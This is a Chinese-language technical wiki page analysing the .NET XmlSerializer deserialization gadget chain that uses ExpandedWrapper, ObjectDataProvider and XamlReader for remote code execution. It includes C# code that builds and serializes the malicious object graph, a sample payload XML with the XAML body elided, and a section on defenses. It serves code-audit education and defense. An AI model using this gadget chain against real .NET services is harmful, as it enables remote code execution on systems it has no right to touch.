---
title: .NET XmlSerializer 反序列化漏洞：ExpandedWrapper Gadget 链深度解析
description: 深度解析 .NET XmlSerializer 反序列化漏洞中 ExpandedWrapper Gadget 链的构造原理、WCF Data
  Services/OData 背景及完整利用链复现，涵盖从 XAML 载荷构造到 ObjectDataProvider 与 XamlReader 组合的 RCE
  利用全过程。
category: program-analysis
tags:
- .NET
- XmlSerializer
- 反序列化
- ExpandedWrapper
- Gadget Chain
- WCF Data Services
- OData
- ObjectDataProvider
- XamlReader
- RCE
- 代码审计
date: 2024-01-15
updated: '2026-11-15'
---

## 概述

`ExpandedWrapper` 是 .NET Framework 中 `System.Data.Services.Client` 命名空间下的一个密封泛型类，最初设计用于 **WCF Data Services**（早期称 ADO.NET Data Services）的扩展查询场景。由于其特殊的泛型结构与公开属性，它在 `XmlSerializer` 反序列化漏洞中成为了关键的 **Gadget 链桥梁**，能够将 `ObjectDataProvider` 与 `XamlReader` 两个原本独立的利用类串联，最终实现任意代码执行（RCE）。

> 微软官方备注：`此类支持 WCF 数据服务基础设施，不建议直接从代码中使用。`

## 背景知识：WCF Data Services 与 OData

### WCF Data Services

**Windows Communication Foundation (WCF) Data Services** 是微软提供的数据服务框架，核心程序集为 `System.Data.Services.dll`。它基于 **Entity Framework** 自动生成具备增删改查功能的 WCF 服务，通过 HTTP 协议与客户端交互，实现数据库的 Web 化访问。

典型部署流程：
1. 定义实体类（如 `Category`、`Product`），标注 `[DataServiceKey("Id")]`
2. 创建 `DataService<T>` 派生类，配置 `EntitySetRights.All` 与 `DataServiceProtocolVersion.V2`
3. 在 `web.config` 中启用 `serviceMetadata` 与 `serviceDebug` 查看异常详情

### OData 协议

**Open Data Protocol (OData)** 是基于 HTTP、AtomPub、JSON 的开放数据协议，支持通过 URL 进行类 SQL 的资源查询。URI 结构包含三部分：

```
http://host/svc/Category(1)/Product?$top=2&$orderby=CategoryName
|____________| |______________________| |______________________|
   服务根 URI          资源路径              查询参数
```

常用查询选项：
- `$expand`：展开导航属性，一次请求获取关联实体
- `$filter`、`$orderby`、`$top`、`$skip`：筛选、排序、分页
- `$select`：投影指定属性

## ExpandedWrapper 类结构与设计意图

### 类定义（简化）

```csharp
[EditorBrowsable(EditorBrowsableState.Never)]
public sealed class ExpandedWrapper<TExpandedElement, TProperty0> : ExpandedWrapper<TExpandedElement>
{
    public TProperty0 ProjectedProperty0 { get; set; }

    protected override object InternalGetExpandedPropertyValue(int nameIndex)
    {
        if (nameIndex == 0) return this.ProjectedProperty0;
        throw Error.NotSupported();
    }
}
```

### 关键特性

| 特性 | 说明 |
|------|------|
| **泛型双参数** | `TExpandedElement` 为被扩展实体，`TProperty0` 为投影属性类型 |
| **公开属性** | `ProjectedProperty0` 为 `public`，可被 `XmlSerializer` 序列化/反序列化 |
| **继承链** | 继承自 `ExpandedWrapper<TExpandedElement>`，形成多层泛型嵌套能力 |
| **设计用途** | 解决 WCF Data Services 多级 `$expand` 场景下的投影结果存储 |

### 实际用法示例

客户端通过 LINQ 构造匿名投影，服务端自动将结果封装为 `ExpandedWrapper`：

```csharp
var q = from d in context.Category
        .Select(p => new
        {
            ExpandedElement = p,
            ProjectedProperty0 = new
            {
                ExpandedElement = "产品分类" + p.CategoryName,
                ProjectedProperty0 = p.Product.Select(x => new { 产品名 = x.ProductName }),
                ProjectedProperty1 = new ObjectDataProvider() // 可存储任意对象
            }
        })
        select new { Name = d.ProjectedProperty0 };
```

`ProjectedProperty0` 与 `ProjectedProperty1` 均为 `object` 类型，**可存储任意 .NET 对象**，且为公开属性 —— 这正是反序列化利用的关键。

## XmlSerializer 反序列化漏洞利用链构造

### 核心利用思路

1. **XAML 载荷** → `ObjectDataProvider` 可解析包含恶意代码的 XAML 标记
2. **方法调用** → `ObjectDataProvider.MethodName = "Parse"`，`MethodParameters` 传入 XAML 字符串，`ObjectInstance = XamlReader` 实例
3. **对象承载** → `ObjectDataProvider` 实例同时持有自身状态与 `XamlReader` 引用
4. **桥接打包** → `ExpandedWrapper<XamlReader, ObjectDataProvider>` 将两者封装，`ProjectedProperty0 = objectDataProvider`
5. **序列化输出** → `XmlSerializer` 序列化 `expandedWrapper` 生成恶意 XML
6. **反序列化触发** → 受害端反序列化时，`ObjectDataProvider` 初始化调用 `XamlReader.Parse()` 执行 XAML 载荷

### 完整利用链路图

```text
XAML Payload (ResourceDictionary + ObjectDataProvider)
        ↓
XamlReader.Parse(XAML)  ← 静态方法解析 XAML 触发代码执行
        ↓
ObjectDataProvider.ObjectInstance = XamlReader 实例
ObjectDataProvider.MethodName = "Parse"
ObjectDataProvider.MethodParameters.Add(XAML 字符串)
        ↓
ExpandedWrapper<XamlReader, ObjectDataProvider>
    .ProjectedProperty0 = ObjectDataProvider 实例
        ↓
XmlSerializer.Serialize(ExpandedWrapper) → 恶意 XML
        ↓
受害端 XmlSerializer.Deserialize(恶意 XML) → RCE
```

### 关键代码片段

#### 构造恶意对象图

```csharp
string xamlPayload = File.ReadAllText("Dictionary1.xaml"); // 包含恶意 ObjectDataProvider 的 XAML

XamlReader xamlReader = new XamlReader();
ObjectDataProvider odp = new ObjectDataProvider();
odp.ObjectInstance = xamlReader;
odp.MethodParameters.Add(xamlPayload);
odp.MethodName = "Parse";

ExpandedWrapper<XamlReader, ObjectDataProvider> wrapper = 
    new ExpandedWrapper<XamlReader, ObjectDataProvider>();
wrapper.ProjectedProperty0 = odp;
```

#### 序列化为 XML

```csharp
using (FileStream fs = File.OpenWrite("payload.xml"))
using (TextWriter tw = new StreamWriter(fs))
{
    XmlSerializer serializer = new XmlSerializer(
        typeof(ExpandedWrapper<XamlReader, ObjectDataProvider>));
    serializer.Serialize(tw, wrapper);
}
```

#### 生成的 XML 关键片段

```xml
<ExpandedWrapperOfXamlReaderObjectDataProvider 
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
    xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <ProjectedProperty0 xsi:type="ObjectDataProvider">
    <ObjectInstance xsi:type="XamlReader" />
    <MethodName>Parse</MethodName>
    <MethodParameters>
      <string>&lt;ResourceDictionary ...&gt;...&lt;/ResourceDictionary&gt;</string>
    </MethodParameters>
  </ProjectedProperty0>
</ExpandedWrapperOfXamlReaderObjectDataProvider>
```

## 为什么是 ExpandedWrapper？Gadget 选择标准

| 要求 | ExpandedWrapper 满足情况 |
|------|--------------------------|
| 公开类型 | `public sealed class` ✅ |
| 公开属性 | `public TProperty0 ProjectedProperty0` ✅ |
| 可泛型化 | 支持任意 `TExpandedElement, TProperty0` ✅ |
| 可承载多对象 | 属性类型为 `object`，可存任意对象图 ✅ |
| 命名空间可达 | `System.Data.Services.Client` 在常见 .NET 应用中默认引用 ✅ |
| 无构造函数限制 | 无参构造函数隐式存在 ✅ |

## 防御与缓解措施

### 禁用/限制 XmlSerializer 反序列化不可信数据

- 避免对不可信 XML 使用 `XmlSerializer.Deserialize()`
- 若必须使用，实施严格的 **类型白名单** 验证

### 类型白名单示例

```csharp
XmlSerializer serializer = new XmlSerializer(typeof(AllowedType), 
    new[] { typeof(AllowedType1), typeof(AllowedType2) });
// 仅允许预期类型，拒绝 ExpandedWrapper 等危险类型
```

### 使用 DataContractSerializer 替代

- `DataContractSerializer` 默认不序列化 `[DataContract]` 未标记的类型
- 更严格的类型控制，减少 Gadget 面

### 运行时监控与检测

- 监控 `System.Data.Services.Client.ExpandedWrapper` 的反序列化行为
- EDR/杀毒软件可针对 `ObjectDataProvider.MethodName="Parse"` 等特征告警

## 相关技术页面交叉引用

- [[xd-security-deserialization-xxe-notes-day37-39]] — XD安全渗透测试课程中关于 PHP/Java 反序列化、XXE 的系统化笔记，提供反序列化漏洞通用原理对比参考
- [[php-webshell-fundamentals-chopper-analysis]] — PHP Webshell 基础与中国菜刀/蚁剑连接分析，对比 .NET 与 Web 场景下的代码执行利用链差异
- [[cve-2023-21716-word-rtf-heap-overflow-analysis]] — CVE-2023-21716 Word RTF 堆溢出分析，展示另一类文档格式解析导致的 RCE 漏洞挖掘思路
- [[memory-scanning-tools-evasion-techniques]] — 内存扫描工具与规避技术，关联 .NET 反序列化利用后的内存态势感知与对抗

## 总结

`ExpandedWrapper` 本是 WCF Data Services 为解决多级 `$expand` 投影设计的基础设施类型，因其**公开泛型结构**、**公开属性**、**可承载任意对象图**等特性，意外成为 `XmlSerializer` 反序列化漏洞中**连接 `ObjectDataProvider` 与 `XamlReader` 的完美 Gadget**。完整利用链不依赖外部库，仅需 .NET Framework 基础程序集，影响面广、利用稳定。

> **核心启示**：框架内部为特定场景设计的“非公共 API”若暴露了可序列化的公开属性，极易成为反序列化 Gadget 链的关键环节。代码审计时应重点关注此类“半公开”类型。

## 参考资源

- 原文来源：.NET高级代码审计(第15课)反序列化Gadget之ExpandedWrapper
- WCF Data Services 官方文档
- OData 协议规范
- .NET Framework 源码：`System.Data.Services.Client.ExpandedWrapper`

## 来源

- [0x6270安全团队-202203-202304_31](../sources/0x6270安全团队-202203-202304_31.md)
